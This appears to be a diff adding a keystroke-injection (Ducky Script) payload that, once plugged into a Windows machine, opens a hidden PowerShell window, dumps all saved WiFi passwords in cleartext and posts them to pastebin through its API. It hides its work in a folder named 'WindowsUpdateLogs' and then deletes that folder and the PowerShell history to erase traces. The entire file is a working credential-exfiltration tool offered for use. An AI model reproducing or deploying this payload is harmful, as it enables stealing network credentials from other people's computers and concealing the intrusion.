@@ -1,0 +1,15 @@
+REM A powershell one-liner WiFi profile exfiltration script. Uses the pastebin api to post the loot.
+REM The post request can be customized to one's preferences, check the api documentation.
+REM Be sure to put in your pastebin api dev and user keys.
+REM By ATotallyRandomGuy
+
+LED 0 0 0
+DELAY 200
+GUI r
+DELAY 300
+STRING powershell.exe -w h
+ENTER
+DELAY 750
+STRING $SMbt = 'New-Item -ItemType "directory" -Path "$($env:USERPROFILE)\AppData\Local\Temp\WindowsUpdateLogs\";cd "$($env:USERPROFILE)\AppData\Local\Temp\WindowsUpdateLogs\";netsh wlan export profile key=clear;powershell Select-String -Path Wi-Fi*.xml -Pattern "keyMaterial" > wifi_details.txt;Remove-Item "$($env:USERPROFILE)\AppData\Local\Temp\WindowsUpdateLogs\*Wi-Fi*";$extract = Get-content -Path "$($env:USERPROFILE)\AppData\Local\Temp\WindowsUpdateLogs\Wifi_details.txt";$name = $env:computername;$Body = @{api_dev_key = "your pastebin api dev key here"; api_paste_code = ("$extract"); api_paste_private = 2; api_paste_expire_date = "10M"; api_paste_name = "$name Wifi Details"; api_option = "paste"; api_user_key = "your pastebin api user key here"}; Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post;cd C:\;Remove-Item "$($env:USERPROFILE)\AppData\Local\Temp\WindowsUpdateLogs\" -Recurse;Remove-Item (Get-PSReadlineOption).HistorySavePath';Invoke-Expression $SMbt;exit
+ENTER
+LED 0 255 0
